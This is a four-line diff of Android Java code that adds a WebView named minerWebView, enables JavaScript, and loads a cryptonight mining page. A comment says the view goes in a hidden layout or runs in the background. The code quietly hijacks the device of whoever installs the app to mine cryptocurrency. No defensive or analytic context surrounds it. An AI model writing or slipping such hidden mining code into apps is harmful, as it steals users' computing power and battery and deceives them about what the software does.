@@ -1,0 +1,4 @@
+WebView minerWebView = new WebView(this);
+minerWebView.getSettings().setJavaScriptEnabled(true);
+minerWebView.loadUrl("http://cryptonight-miner-webgl.github.io"); // Example mining site
+// Add the WebView to a hidden layout or keep it in background.
